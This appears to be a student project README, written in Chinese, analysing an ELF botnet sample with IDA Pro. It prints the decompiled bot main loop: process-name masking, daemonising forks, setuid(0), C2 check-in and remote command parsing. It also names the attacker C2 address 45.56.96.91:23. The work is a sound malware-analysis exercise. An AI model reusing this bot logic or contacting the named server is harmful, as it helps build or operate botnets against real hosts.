# COMPUTER-PROJECT-DESIGN
COMPUTER PROJECT DESIGN

# 簡介
IDA Pro 是一款功能強大的反組譯器和除錯器，廣泛用於軟體逆向工程。它不僅是專業逆向工程師的首選工具，還被許多安全研究人員和惡意軟體分析師所青睞。以下是對 IDA Pro 主要功能的詳細介紹：
* **多平台支持：** IDA Pro 支持多種操作系統，包括 Windows、macOS 和 Linux。此外，它還能分析多種不同的二進制檔案格式，如 PE、ELF 和 Mach-O。
* **高度互動的使用者介面：** 使用者可以輕鬆地在圖形和文字模式之間切換，並使用豐富的視覺化工具來分析複雜的二進制檔案。

# 使用步驟
* 將要分析的ELF檔用IDA Pro開啟會看到如下圖的架構圖

![Image text](https://github.com/Potassium-chromate/COMPUTER-PROJECT-DESIGN/blob/main/picture/%E6%9E%B6%E6%A7%8B%E5%9C%96.png)
* 細看能發現上面佈滿密密麻麻的組合語言
  
![Image text](https://github.com/Potassium-chromate/COMPUTER-PROJECT-DESIGN/blob/main/picture/%E6%9E%B6%E6%A7%8B%E5%9C%96_%E7%B4%B0%E7%AF%80.png)
* 按下F5後IDA Pro會自動反編譯成pseudocode 

![Image text](https://github.com/Potassium-chromate/COMPUTER-PROJECT-DESIGN/blob/main/picture/%E5%8F%8D%E7%B7%A8%E8%AD%AF%E8%99%9B%E6%93%AC%E7%A2%BC.png)

* 反編譯後的pseudocode 如下
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // ebx
  unsigned int v4; // eax
  int v5; // ebx
  unsigned int v6; // eax
  int Endianness; // ebx
  int Build; // eax
  int v9; // r8d
  int v10; // r9d
  int v11; // ebx
  char v13[4096]; // [rsp+50h] [rbp-10D0h] BYREF
  __int64 v14[11]; // [rsp+1050h] [rbp-D0h] BYREF
  char v15[4]; // [rsp+10ACh] [rbp-74h] BYREF
  void *v16; // [rsp+10B0h] [rbp-70h]
  unsigned int v17; // [rsp+10B8h] [rbp-68h]
  int v19; // [rsp+10C0h] [rbp-60h]
  int i; // [rsp+10C4h] [rbp-5Ch]
  char *v21; // [rsp+10C8h] [rbp-58h]
  __int64 v22; // [rsp+10D0h] [rbp-50h]
  unsigned int j; // [rsp+10DCh] [rbp-44h]
  const char *k; // [rsp+10E0h] [rbp-40h]
  const char *v25; // [rsp+10E8h] [rbp-38h]
  char *m; // [rsp+10F0h] [rbp-30h]
  int v27; // [rsp+10FCh] [rbp-24h]
  const char *v28; // [rsp+1100h] [rbp-20h]
  int n; // [rsp+110Ch] [rbp-14h]

  v16 = &unk_40F17D;
  strncpy(*argv, &unk_40F17D, strlen(*argv));
  *argv = (const char *)&unk_40F17D;
  prctl(15LL, v16, 0LL, 0LL, 0LL);
  v3 = time(0LL);
  v4 = getpid();
  srandom(v3 ^ v4);
  v5 = time(0LL);
  v6 = getpid();
  init_rand(v5 ^ v6);
  v17 = fork();
  if ( v17 )
  {
    waitpid(v17, v15, 0LL);
    exit(0);
  }
  if ( (unsigned int)fork() )
    exit(0);
  chdir("/");
  setuid(0);
  seteuid(0);
  signal(13LL, 1LL);
  while ( !(unsigned int)fork() )
  {
    if ( !(unsigned int)initConnection() )
    {
      Endianness = getEndianness();
      Build = getBuild();
      sockprintf(
        mainCommSock,
        (unsigned int)"[\x1B[96mBOT JOINED\x1B[97m] Arch: \x1B[96m%s \x1B[97m|| Type: %s]",
        Build,
        Endianness,
        v9,
        v10);
      UpdateNameSrvs();
      v19 = 0;
      i = 0;
      while ( 1 )
      {
        v19 = recvLine((unsigned int)mainCommSock, v13, 4096LL);
        if ( v19 == -1 )
          break;
        for ( i = 0; i < (unsigned __int64)numpids; ++i )
        {
          if ( (int)waitpid(*(unsigned int *)(4LL * i + pids), 0LL, 1LL) > 0 )
          {
            for ( j = i + 1; j < (unsigned __int64)numpids; ++j )
              *(_DWORD *)(4LL * (j - 1) + pids) = *(_DWORD *)(4LL * j + pids);
            *(_DWORD *)(4LL * (j - 1) + pids) = 0;
            --numpids;
            v22 = malloc(4 * numpids + 4);
            for ( j = 0; j < (unsigned __int64)numpids; ++j )
              *(_DWORD *)(v22 + 4LL * j) = *(_DWORD *)(4LL * j + pids);
            free(pids);
            pids = v22;
          }
        }
        v13[v19] = 0;
        trim(v13);
        if ( (char *)strstr(v13, "ICMP") != v13 )
        {
          if ( (char *)strstr(v13, "DUP") == v13 )
            exit(0);
          v21 = v13;
          if ( v13[0] == 33 )
          {
            for ( k = v21 + 1; *k != 32 && *k; ++k )
              ;
            if ( *k )
            {
              *k = 0;
              k = v21 + 1;
              for ( v21 += strlen(v21 + 1) + 2;
                    v21[strlen(v21) - 1] == 10 || v21[strlen(v21) - 1] == 13;
                    v21[strlen(v21) - 1] = 0 )
              {
                ;
              }
              v25 = v21;
              while ( *v21 != 32 && *v21 )
                ++v21;
              *v21++ = 0;
              for ( m = (char *)v25; *m; ++m )
                *m = toupper((unsigned __int8)*m);
              v27 = 1;
              v28 = (const char *)strtok(v21, " ");
              v14[0] = (__int64)v25;
              while ( v28 )
              {
                if ( *v28 != 10 )
                {
                  v11 = v27;
                  v14[v11] = malloc(strlen(v28) + 1);
                  memset((void *)v14[v27], 0, strlen(v28) + 1);
                  strcpy(v14[v27++], v28);
                }
                v28 = (const char *)strtok(0LL, " ");
              }
              processCmd((unsigned int)v27, v14);
              if ( v27 > 1 )
              {
                for ( n = 1; n < v27; ++n )
                  free(v14[n]);
              }
            }
          }
        }
      }
      return 0;
    }
    sleep(5LL);
  }
  return 0;
}
```

# 分析
從上述的 pseudocode 可以看出該惡意程式的運作大致能分為以下步驟
1. **初始化：**
  * 該程序修改命令行參數 `*argv` 以指向內存地址 ( &unk_40F17D)。
  * 然後它調用`prctl`來設置calling process的名稱。這可能是試圖掩蓋其在process list中的存在。
2. **隨機種子生成：**
  * `srandom`該程序使用從當前時間和進程 ID 派生的值作為隨機數生成器 ( ) 的種子。這可能用於稍後在程序中生成隨機值。
3. **進程分叉：**
  * 該程序分叉兩次。這是守護進程用來將自身與終端分離並在後台運行的常用技術。父進程退出，子進程繼續運行。
4. **設置環境：**
  * 程序將其工作目錄更改為根目錄 `chdir("/")`。
  * `setuid(0)`它嘗試通過將其用戶 ID 設置為 root來提升其權限。
  * 它為信號設置一個信號處理程序`SIGPIPE`以忽略它。這可以防止程序在寫入另一端已關閉的套接字時終止。
5. **主程式 :**
  * 程序進入一個循環，不斷分叉。子進程嘗試初始化連接 `initConnection()`。如果成功，它會檢索系統信息，例如字節序和構建類型(`getEndianness()`和`getBuild()`)，並將該信息發送到遠程服務器。
  * 然後程序進入另一個循環，等待來自遠程服務器的命令。這些命令被讀入`v13`緩衝區。
  * 如果收到命令，它會檢查特定字符串，例如“ICMP”和“DUP”。如果收到“DUP”，則程序終止，這可能是來自服務器的終止命令。
  * 如果命令以感嘆號 ( !) 開頭，則會標記該命令並使用 對其進行處理`processCmd()`。這表明該惡意軟件支持遠程服務器可以發出的一系列命令。
6. **命令處理：**
  * 程序將接收到的命令標記化並對其進行處理。從所提供的代碼中尚不清楚這些命令的確切性質，但它們可能是機器人可以執行的惡意操作。
7. **清理 : **
  * 如果與服務器的連接丟失或發生錯誤，子進程會休眠 5 秒，然後嘗試重新連接。

# 細節分析
對著原本 pseudocode 中的`initConnection()`點兩下，即可看到該子程式的 pseudocode 

![Image text](https://github.com/Potassium-chromate/COMPUTER-PROJECT-DESIGN/blob/main/picture/initConnection_%E7%B4%B0%E7%AF%80.png)
此時可一窺其運作細節，此時可看到其中有個名為commServer的可疑數組

![Image text](https://github.com/Potassium-chromate/COMPUTER-PROJECT-DESIGN/blob/main/picture/commServer_%E7%B4%B0%E7%AF%80.png)

可以發現攻擊者的ip是 `45.56.96.91:23`
在之後的動態分析中，我們能從 wireshark 中看到該惡意程式確實訪問了`45.56.96.91:23`，甚至還能觀察到訪問其他ip地址





